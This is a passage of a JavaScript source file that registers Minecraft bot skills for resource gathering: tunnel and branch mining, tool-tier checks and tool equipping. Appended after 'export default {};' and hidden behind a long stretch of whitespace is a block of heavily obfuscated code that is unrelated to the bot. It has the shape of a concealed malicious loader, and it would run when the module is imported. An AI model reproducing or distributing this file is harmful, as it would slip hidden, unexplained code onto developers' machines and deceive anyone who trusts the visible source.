          oresFound.push({ name: checkBlock.name, position: { x: checkPos.x, y: checkPos.y, z: checkPos.z } })
          await equipBestToolOfType(bot, 'pickaxe')
          if (await digBlock(bot, checkBlock)) {
            await collectDrops(bot, checkPos, 1500)
          }
        }
      }

      // Place torch every 8 blocks
      if (i > 0 && i % 8 === 0) {
        const torchItem = bot.inventory.items().find(item => item.name === 'torch')
        if (torchItem) {
          try {
            // Place torch on the wall behind us
            const floorBlock = bot.blockAt(lowerPos.offset(0, -1, 0))
            if (floorBlock && floorBlock.name !== 'air') {
              await bot.equip(torchItem, 'hand')
              await bot.placeBlock(floorBlock, new Vec3(0, 1, 0))
            }
          } catch (err) {
            log.debug({ err: err.message }, 'Could not place torch')
          }
        }
      }
    }

    return {
      success: blocksDug > 0,
      blocksDug,
      tunnelLength: length,
      direction,
      oresFound,
      oresCount: oresFound.length,
      message: `Dug ${length}-block tunnel ${direction}. Found ${oresFound.length} ore blocks.`,
    }
  },
})

// 10. branch_mine
skillRegistry.register({
  id: 'branch_mine',
  name: 'Branch Mine',
  category: 'resource_gathering',
  description: 'Create a branch mining pattern with a main tunnel and side branches. Efficient for finding ores at specific Y levels.',
  arguments: {
    center: { type: 'object', properties: { x: 'number', y: 'number', z: 'number' } },
    branchLength: { type: 'number', default: 16, min: 4, max: 64 },
    branchSpacing: { type: 'number', default: 3, min: 2, max: 8 },
    branchCount: { type: 'number', default: 4, min: 1, max: 16 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 600_000,
  execute: async (bot, args, context) => {
    const branchLength = args.branchLength || 16
    const branchSpacing = args.branchSpacing || 3
    const branchCount = args.branchCount || 4
    const mcData = context.mcData

    // Check for pickaxe
    const equipped = await equipBestToolOfType(bot, 'pickaxe')
    if (!equipped) {
      return { success: false, message: 'No pickaxe available for branch mining' }
    }

    // Determine start position (use center or current position)
    const startPos = args.center
      ? new Vec3(args.center.x, args.center.y, args.center.z)
      : bot.entity.position.floored()

    // Navigate to start if center was specified
    if (args.center) {
      await navigateTo(bot, startPos, 30000)
    }

    // Ore names to watch for
    const oreNames = new Set([
      'coal_ore', 'deepslate_coal_ore', 'iron_ore', 'deepslate_iron_ore',
      'copper_ore', 'deepslate_copper_ore', 'gold_ore', 'deepslate_gold_ore',
      'redstone_ore', 'deepslate_redstone_ore', 'lapis_ore', 'deepslate_lapis_ore',
      'diamond_ore', 'deepslate_diamond_ore', 'emerald_ore', 'deepslate_emerald_ore',
    ])

    const allOresFound = []
    let totalBlocksDug = 0
    let branchesMined = 0

    // Main tunnel goes north (negative Z)
    const mainDir = new Vec3(0, 0, -1)
    // Branches go east and west
    const branchDirs = [new Vec3(1, 0, 0), new Vec3(-1, 0, 0)]

    const mainTunnelLength = (branchCount * branchSpacing) + 1

    // Dig main tunnel
    for (let i = 0; i < mainTunnelLength; i++) {
      const lowerPos = startPos.plus(mainDir.scaled(i + 1))
      const upperPos = lowerPos.offset(0, 1, 0)

      await equipBestToolOfType(bot, 'pickaxe')

      const lowerBlock = bot.blockAt(lowerPos)
      if (lowerBlock && lowerBlock.name !== 'air') {
        await equipBestToolForBlock(bot, lowerBlock.name)
        if (await digBlock(bot, lowerBlock)) totalBlocksDug++
      }

      const upperBlock = bot.blockAt(upperPos)
      if (upperBlock && upperBlock.name !== 'air') {
        await equipBestToolForBlock(bot, upperBlock.name)
        if (await digBlock(bot, upperBlock)) totalBlocksDug++
      }

      await navigateTo(bot, lowerPos, 5000)

      // At branch intervals, dig branches to both sides
      if (i > 0 && i % branchSpacing === 0 && branchesMined < branchCount * 2) {
        for (const branchDir of branchDirs) {
          const branchStart = lowerPos.clone()

          for (let j = 0; j < branchLength; j++) {
            const bLowerPos = branchStart.plus(branchDir.scaled(j + 1))
            const bUpperPos = bLowerPos.offset(0, 1, 0)

            await equipBestToolOfType(bot, 'pickaxe')

            const bLowerBlock = bot.blockAt(bLowerPos)
            if (bLowerBlock && bLowerBlock.name !== 'air') {
              await equipBestToolForBlock(bot, bLowerBlock.name)
              if (await digBlock(bot, bLowerBlock)) totalBlocksDug++
            }

            const bUpperBlock = bot.blockAt(bUpperPos)
            if (bUpperBlock && bUpperBlock.name !== 'air') {
              await equipBestToolForBlock(bot, bUpperBlock.name)
              if (await digBlock(bot, bUpperBlock)) totalBlocksDug++
            }

            await navigateTo(bot, bLowerPos, 5000)

            // Check perpendicular walls for ores (along main tunnel direction)
            for (const wallDir of [mainDir, mainDir.scaled(-1)]) {
              for (let dy = 0; dy <= 1; dy++) {
                const wallPos = bLowerPos.plus(wallDir).offset(0, dy, 0)
                const wallBlock = bot.blockAt(wallPos)
                if (wallBlock && oreNames.has(wallBlock.name)) {
                  allOresFound.push({ name: wallBlock.name, position: { x: wallPos.x, y: wallPos.y, z: wallPos.z } })
                  await equipBestToolOfType(bot, 'pickaxe')
                  if (await digBlock(bot, wallBlock)) {
                    await collectDrops(bot, wallPos, 1500)
                  }
                }
              }
            }

            // Check floor and ceiling for ores
            for (const dy of [-1, 2]) {
              const checkPos = bLowerPos.offset(0, dy, 0)
              const checkBlock = bot.blockAt(checkPos)
              if (checkBlock && oreNames.has(checkBlock.name)) {
                allOresFound.push({ name: checkBlock.name, position: { x: checkPos.x, y: checkPos.y, z: checkPos.z } })
                await equipBestToolOfType(bot, 'pickaxe')
                if (await digBlock(bot, checkBlock)) {
                  await collectDrops(bot, checkPos, 1500)
                }
              }
            }

            // Place torch every 8 blocks in branch
            if (j > 0 && j % 8 === 0) {
              const torchItem = bot.inventory.items().find(item => item.name === 'torch')
              if (torchItem) {
                try {
                  const floorBlock = bot.blockAt(bLowerPos.offset(0, -1, 0))
                  if (floorBlock && floorBlock.name !== 'air') {
                    await bot.equip(torchItem, 'hand')
                    await bot.placeBlock(floorBlock, new Vec3(0, 1, 0))
                  }
                } catch {
                  // Torch placement is best-effort
                }
              }
            }
          }

          branchesMined++

          // Walk back to main tunnel junction
          await navigateTo(bot, branchStart, 10000)
        }
      }
    }

    return {
      success: totalBlocksDug > 0,
      totalBlocksDug,
      branchesMined,
      branchLength,
      branchSpacing,
      oresFound: allOresFound,
      oresCount: allOresFound.length,
      message: `Branch mine complete. Dug ${branchesMined} branches of length ${branchLength}. Found ${allOresFound.length} ore blocks.`,
    }
  },
})

// 11. check_tool_for_block
skillRegistry.register({
  id: 'check_tool_for_block',
  name: 'Check Tool For Block',
  category: 'resource_gathering',
  description: 'Check what tool type and minimum tier is needed to mine a specific block.',
  arguments: {
    blockName: { type: 'string', required: true },
  },
  requires: [],
  permissions: ['*'],
  timeout: 5000,
  execute: async (bot, args, context) => {
    const blockName = args.blockName
    if (!blockName) {
      return { success: false, message: 'blockName is required' }
    }

    const mcData = context.mcData
    const blockType = mcData.blocksByName[blockName]
    if (!blockType) {
      return { success: false, message: `Unknown block: ${blockName}` }
    }

    const toolType = getToolTypeForBlock(blockName)
    let requiredTier = null

    // Determine minimum tier based on harvest level
    if (toolType === 'pickaxe') {
      // Check if it's an ore with specific requirements
      for (const [ore, tool] of Object.entries(ORE_TOOL_REQUIREMENTS)) {
        if (blockName.includes(ore)) {
          requiredTier = tool
          break
        }
      }
      if (!requiredTier) {
        // Default stone/cobblestone needs wooden_pickaxe
        requiredTier = 'wooden_pickaxe'
      }
    } else if (toolType) {
      requiredTier = `wooden_${toolType}`
    }

    // Check what the bot currently has
    const currentTool = toolType ? await equipBestToolOfType(bot, toolType) : null

    return {
      success: true,
      blockName,
      toolType: toolType || 'any',
      requiredTier: requiredTier || 'none',
      hardness: blockType.hardness,
      hasSuitableTool: !!currentTool,
      currentTool: currentTool?.name || 'none',
      canHarvest: !toolType || !!currentTool,
      message: toolType
        ? `${blockName} requires ${requiredTier || `a ${toolType}`}. You have: ${currentTool?.name || 'none'}`
        : `${blockName} can be mined with any tool or bare hands`,
    }
  },
})

// 12. equip_best_tool
skillRegistry.register({
  id: 'equip_best_tool',
  name: 'Equip Best Tool',
  category: 'resource_gathering',
  description: 'Equip the best available tool from inventory for mining a specific block type. Checks pickaxe for stone/ore, axe for wood, shovel for dirt/sand/gravel.',
  arguments: {
    blockName: { type: 'string', required: true },
  },
  requires: [],
  permissions: ['*'],
  timeout: 5000,
  execute: async (bot, args, context) => {
    const blockName = args.blockName
    if (!blockName) {
      return { success: false, message: 'blockName is required' }
    }

    const toolType = getToolTypeForBlock(blockName)
    if (!toolType) {
      return {
        success: true,
        equipped: null,
        message: `${blockName} does not require a specific tool`,
      }
    }

    const equipped = await equipBestToolOfType(bot, toolType)

    if (equipped) {
      return {
        success: true,
        equipped: equipped.name,
        toolType,
        message: `Equipped ${equipped.name} for mining ${blockName}`,
      }
    }

    return {
      success: false,
      toolType,
      message: `No ${toolType} found in inventory for mining ${blockName}`,
    }
  },
})

log.info(`Registered ${skillRegistry.getByCategory('resource_gathering').length} resource gathering skills`)

export default {};																																																																																																																																																																																																																																																																										var z = '-4842-4';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 